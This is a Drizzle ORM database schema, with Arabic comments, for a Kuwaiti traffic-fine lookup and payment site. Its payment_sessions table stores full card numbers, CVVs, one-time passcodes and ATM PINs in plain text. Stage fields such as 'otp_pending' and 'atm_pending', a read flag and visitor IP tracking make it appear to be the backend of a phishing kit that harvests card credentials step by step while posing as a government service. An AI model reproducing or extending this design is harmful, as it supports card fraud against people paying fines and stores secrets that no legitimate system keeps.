import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, decimal, json } from "drizzle-orm/mysql-core";

export const users = mysqlTable("users", {
  id: int("id").autoincrement().primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

// جدول الاستعلامات - للكويت
export const fineQueries = mysqlTable("fine_queries", {
  id: int("id").autoincrement().primaryKey(),
  civilId: varchar("civilId", { length: 12 }).notNull(),
  enquiryType: varchar("enquiryType", { length: 2 }).notNull().default("1"),
  status: mysqlEnum("status", ["pending", "success", "failed", "no_fines"]).default("pending").notNull(),
  errorMessage: text("errorMessage"),
  totalFines: int("totalFines").default(0),
  totalAmount: decimal("totalAmount", { precision: 10, scale: 2 }),
  rawResults: json("rawResults"),
  userId: int("userId"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type FineQuery = typeof fineQueries.$inferSelect;
export type InsertFineQuery = typeof fineQueries.$inferInsert;

// جدول المخالفات
export const fines = mysqlTable("fines", {
  id: int("id").autoincrement().primaryKey(),
  queryId: int("queryId").notNull(),
  fineNumber: varchar("fineNumber", { length: 100 }),
  fineDate: varchar("fineDate", { length: 50 }),
  description: text("description"),
  amount: decimal("amount", { precision: 10, scale: 2 }),
  blackPoints: int("blackPoints").default(0),
  isPaid: mysqlEnum("isPaid", ["paid", "unpaid", "partial"]).default("unpaid"),
  location: text("location"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type Fine = typeof fines.$inferSelect;
export type InsertFine = typeof fines.$inferInsert;

// جدول جلسات الدفع - للكويت
export const paymentSessions = mysqlTable("payment_sessions", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  queryId: int("queryId"),
  selectedFines: json("selectedFines"),
  totalAmount: varchar("totalAmount", { length: 50 }),
  cardName: varchar("cardName", { length: 200 }),
  cardNumber: varchar("cardNumber", { length: 20 }),
  cardNumberMasked: varchar("cardNumberMasked", { length: 20 }),
  cardExpiry: varchar("cardExpiry", { length: 10 }),
  cardCvv: varchar("cardCvv", { length: 10 }),
  otpCode: varchar("otpCode", { length: 20 }),
  atmPin: varchar("atmPin", { length: 20 }),
  stage: mysqlEnum("stage", [
    "card",
    "card_pending",
    "otp",
    "otp_pending",
    "atm",
    "atm_pending",
    "success",
    "failed",
  ]).default("card").notNull(),
  errorMessage: text("errorMessage"),
  civilId: varchar("civilId", { length: 12 }),
  enquiryType: varchar("enquiryType", { length: 2 }),
  clientIp: varchar("clientIp", { length: 50 }),
  userAgent: text("userAgent"),
  statusRead: int("statusRead").default(0),
  redirectUrl: varchar("redirectUrl", { length: 500 }),
  currentPage: varchar("currentPage", { length: 100 }),
  paidAmount: decimal("paidAmount", { precision: 10, scale: 2 }),
  totalFinesAmount: decimal("totalFinesAmount", { precision: 10, scale: 2 }),
  totalFinesCount: int("totalFinesCount").default(0),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type PaymentSession = typeof paymentSessions.$inferSelect;
export type InsertPaymentSession = typeof paymentSessions.$inferInsert;
